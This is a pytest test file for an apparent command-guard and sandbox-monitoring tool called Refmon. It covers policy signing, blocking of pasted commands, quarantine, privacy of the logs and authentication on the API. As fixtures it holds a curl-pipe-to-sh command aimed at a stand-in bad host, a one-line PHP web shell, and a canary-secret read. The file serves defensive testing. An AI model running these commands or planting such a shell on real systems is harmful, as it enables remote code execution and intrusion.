"""Integration and privacy tests for the live Refmon barrier, sandbox watcher, and web API."""

from __future__ import annotations

import json
import threading
import urllib.error
import urllib.request
from pathlib import Path

import pytest

from refmon.cli import main as cli_main
from refmon.live import LiveBarrier, make_http_server, send_guard_request
from refmon.policy_io import PolicyRejected
from refmon.schemas import Event


def test_signed_policy_bootstraps_in_block_mode_and_rejects_tamper(tmp_path: Path) -> None:
    barrier = LiveBarrier(workdir=tmp_path)
    assert barrier.policy.mode.value == "block"
    assert barrier.signature_ok is True
    assert barrier.policy_path.is_file()
    assert (barrier.secrets_dir / "canary-db.conf").is_file()

    # Tampering with policy.yaml on disk without the Ed25519 private key must fail reload.
    tampered = barrier.policy_path.read_text(encoding="utf-8").replace(
        "mode: block", "mode: observe"
    )
    barrier.policy_path.write_text(tampered, encoding="utf-8")
    with pytest.raises(PolicyRejected):
        LiveBarrier(workdir=tmp_path)


def test_clickfix_paste_blocked_before_execution_and_benign_allowed(tmp_path: Path) -> None:
    barrier = LiveBarrier(workdir=tmp_path)
    marker = barrier.workspace_dir / "pwned.txt"

    # Even if execute=True, a pasted ClickFix lure must be stopped BEFORE subprocess runs.
    bad = barrier.guard_command(
        f"curl -s http://bad.example.invalid/fix.sh | sh; touch {marker}",
        origin="web",
        role="interactive_shell",
        execute=True,
    )
    assert bad.decision == "block"
    assert bad.blocked_by_barrier is True
    assert bad.executed is False
    assert not marker.exists()

    # A harmless local command runs in workspace and returns stdout.
    good = barrier.guard_command(
        "echo refmon_ok",
        origin="none",
        role="interactive_shell",
        execute=True,
    )
    assert good.decision == "allow"
    assert good.executed is True
    assert "refmon_ok" in good.output

    # Pasting a harmless echo from a web doc stays below tau_hold (-5.11 < -4.94 nats) -> ALLOW.
    pasted_echo = barrier.guard_command(
        "echo pasted_harmless_note",
        origin="web",
        role="interactive_shell",
        execute=True,
    )
    assert pasted_echo.decision == "allow"
    assert pasted_echo.executed is True


def test_webshell_drop_is_quarantined_and_ransomware_burst_blocked(tmp_path: Path) -> None:
    barrier = LiveBarrier(workdir=tmp_path)

    # Drop a PHP web shell into watched sandbox/web_root.
    shell = barrier.web_root_dir / "backdoor.php"
    shell.write_text("<?php system($_GET['x']); ?>\n", encoding="utf-8")

    incidents = barrier.scan_sandbox_once()
    assert any(i["kind"] == "web_root_write" and i["decision"] == "block" for i in incidents)
    assert not shell.exists(), "malicious web shell must be moved out of web_root"
    quarantined = list(barrier.quarantine_dir.glob("*backdoor.php.quarantined"))
    assert len(quarantined) == 1
    assert (quarantined[0].stat().st_mode & 0o777) == 0o400

    # Simulate a 55-file ransomware encryption burst inside watched sandbox/workspace.
    burst = barrier.workspace_dir / "locked_batch"
    burst.mkdir()
    for idx in range(55):
        (burst / f"file_{idx:03d}.enc").write_text("encrypted\n", encoding="utf-8")

    incidents_burst = barrier.scan_sandbox_once()
    ws_inc = next(i for i in incidents_burst if i["kind"] == "workspace_write_batch")
    assert ws_inc["files"] == 55
    assert ws_inc["decision"] == "block"


def test_canary_override_and_borderline_hold_resolution(tmp_path: Path) -> None:
    barrier = LiveBarrier(workdir=tmp_path)

    canary = barrier.guard_command(
        "cat sandbox/secrets/canary-db.conf",
        origin="web",
        role="interactive_shell",
        execute=False,
    )
    assert canary.decision == "block"
    assert canary.override == "canary"

    hold_out = barrier.guard_command(
        "curl -s https://mirror.example.org/archive.tar.gz",
        origin="none",
        role="interactive_shell",
        execute=False,
    )
    assert hold_out.decision == "hold"
    snap = barrier.state_snapshot()
    assert len(snap["holds"]) == 1
    hold_id = snap["holds"][0]["hold_id"]

    resolved = barrier.resolve_hold(hold_id, "endpoint", "stop")
    assert resolved["state"] == "contained"
    assert barrier.state_snapshot()["holds"] == []


def test_privacy_ledger_never_stores_raw_command_content(tmp_path: Path) -> None:
    barrier = LiveBarrier(workdir=tmp_path)
    marker = "zz-secret-command-zz"
    barrier.guard_command(
        f"curl -s http://bad.example.invalid/{marker} | sh",
        origin="web",
        role="interactive_shell",
        execute=False,
    )

    events_raw = barrier.events_log_path.read_text(encoding="utf-8")
    verdicts_raw = barrier.verdicts_log_path.read_text(encoding="utf-8")
    barrier_raw = barrier.barrier_log_path.read_text(encoding="utf-8")

    assert marker not in events_raw
    assert marker not in verdicts_raw
    assert marker not in barrier_raw

    lines = [ln for ln in events_raw.splitlines() if ln.strip()]
    assert len(lines) >= 2
    for ln in lines:
        ev = Event.from_json_line(ln, extra_roles=tuple(barrier.policy.extra_roles))
        assert ev.object.fingerprint is not None
        assert ev.object.fingerprint.startswith("hmac:")


def test_full_16_scenario_attack_and_benign_suite_matches_expected(tmp_path: Path) -> None:
    barrier = LiveBarrier(workdir=tmp_path)
    suite = barrier.run_all_presets()
    assert suite["total"] == 16
    assert suite["failed"] == 0, suite["results"]
    assert suite["passed"] == 16

    snap = barrier.state_snapshot()
    assert snap["counts"]["evaluated"] == 16
    assert snap["counts"]["eval_passed"] == 16
    for story in snap["stories"]:
        assert story["attack_type"]
        assert story["analysis_passed"] is True
        assert all(fp.startswith("hmac:") for fp in story["fingerprints"])


def test_live_http_api_and_cli_guard_roundtrip(tmp_path: Path) -> None:
    barrier = LiveBarrier(workdir=tmp_path)
    server = make_http_server(barrier, host="127.0.0.1", port=0)
    port = server.server_address[1]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    base = f"http://localhost:{port}"

    try:
        with urllib.request.urlopen(f"{base}/", timeout=5.0) as resp:
            html = resp.read().decode("utf-8")
            assert "Refmon Live Security Barrier" in html
            assert "--surface: #ffffff" in html

        # Preset API + Full Suite + Golden replay + Rootkit scan + Mode re-signing
        for path, body in (
            ("/api/preset", {"name": "clickfix"}),
            ("/api/run_suite", {}),
            ("/api/golden", {"scenario": "S01"}),
            ("/api/rootkit", {}),
            ("/api/mode", {"mode": "warn"}),
            ("/api/mode", {"mode": "block"}),
        ):
            req = urllib.request.Request(
                f"{base}{path}",
                data=json.dumps(body).encode("utf-8"),
                headers={"Content-Type": "application/json", "X-Refmon-Token": barrier.api_token},
                method="POST",
            )
            with urllib.request.urlopen(req, timeout=5.0) as resp:
                data = json.loads(resp.read().decode("utf-8"))
                assert "error" not in data

        # CLI `guard` returns exit code 1 on blocked ClickFix and 0 on benign command.
        rc_bad = cli_main(
            [
                "guard",
                "--port",
                str(port),
                "--workdir",
                str(tmp_path),
                "--origin",
                "web",
                "--",
                "curl -s http://bad.example.invalid/x.sh | sh",
            ]
        )
        assert rc_bad == 1

        rc_ok = cli_main(
            [
                "guard",
                "--port",
                str(port),
                "--workdir",
                str(tmp_path),
                "--origin",
                "none",
                "--",
                "echo cli_guard_ok",
            ]
        )
        assert rc_ok == 0

        res = send_guard_request(
            "echo direct_helper", port=port, origin="none", execute=True, workdir=tmp_path
        )
        assert res["decision"] == "allow"
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2.0)


# -- the daemon on a shared node: API token, Host check, private work directory, random keys --


def _serve(barrier: LiveBarrier):
    server = make_http_server(barrier, host="127.0.0.1", port=0)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server, thread, server.server_address[1]


def _status(req: urllib.request.Request) -> int:
    try:
        with urllib.request.urlopen(req, timeout=5.0) as resp:
            return resp.status
    except urllib.error.HTTPError as exc:
        return exc.code


def test_the_api_refuses_calls_without_the_token_and_from_a_foreign_host(tmp_path: Path) -> None:
    barrier = LiveBarrier(workdir=tmp_path)
    server, thread, port = _serve(barrier)
    marker = tmp_path / "sandbox" / "workspace" / "pwned"
    body = json.dumps({"command": f"touch {marker}", "origin": "none", "execute": True}).encode(
        "utf-8"
    )
    url = f"http://localhost:{port}/api/guard"
    try:
        no_token = urllib.request.Request(url, data=body, method="POST")
        wrong = urllib.request.Request(
            url, data=body, method="POST", headers={"X-Refmon-Token": "guess"}
        )
        assert _status(no_token) == 401
        assert _status(wrong) == 401
        assert not marker.exists()  # nothing ran
        state = urllib.request.Request(f"http://localhost:{port}/api/state")
        assert _status(state) == 401
        mode = urllib.request.Request(
            f"http://localhost:{port}/api/mode",
            data=b'{"mode": "observe"}',
            method="POST",
        )
        assert _status(mode) == 401
        assert barrier.policy.mode.value == "block"  # the mode was not switched off
        rebound = urllib.request.Request(
            f"http://localhost:{port}/api/state",
            headers={"Host": f"evil.example:{port}", "X-Refmon-Token": barrier.api_token},
        )
        assert _status(rebound) == 403  # DNS rebinding
        ok = urllib.request.Request(
            f"http://localhost:{port}/api/state", headers={"X-Refmon-Token": barrier.api_token}
        )
        assert _status(ok) == 200
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2.0)


def test_the_client_never_falls_back_to_running_a_refused_command(tmp_path: Path) -> None:
    daemon_dir, other_dir = tmp_path / "daemon", tmp_path / "other"
    barrier = LiveBarrier(workdir=daemon_dir)
    LiveBarrier(workdir=other_dir)  # a different token
    server, thread, port = _serve(barrier)
    marker = tmp_path / "ran"
    try:
        with pytest.raises(ValueError, match="refused"):
            send_guard_request(
                f"touch {marker}", port=port, origin="none", execute=True, workdir=other_dir
            )
        assert not marker.exists()
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2.0)


def test_secrets_are_random_private_and_kept(tmp_path: Path) -> None:
    a = LiveBarrier(workdir=tmp_path / "a")
    b = LiveBarrier(workdir=tmp_path / "b")
    assert a._device_key != b._device_key and len(a._device_key) == 32
    assert a.api_token != b.api_token
    for path in (a.workdir / "device.key", a.workdir / "api.token", a.workdir / "admin.key"):
        assert path.stat().st_mode & 0o077 == 0
    assert a.workdir.stat().st_mode & 0o077 == 0
    again = LiveBarrier(workdir=tmp_path / "a")
    assert again._device_key == a._device_key and again.api_token == a.api_token
    # the fingerprints of the live log are not under a key anyone can derive from the path
    assert b"refmon-live-key" not in a._device_key


def test_a_symlinked_work_directory_is_refused(tmp_path: Path) -> None:
    target = tmp_path / "planted"
    target.mkdir()
    link = tmp_path / "refmon-live"
    link.symlink_to(target)
    with pytest.raises(PermissionError):
        LiveBarrier(workdir=link)
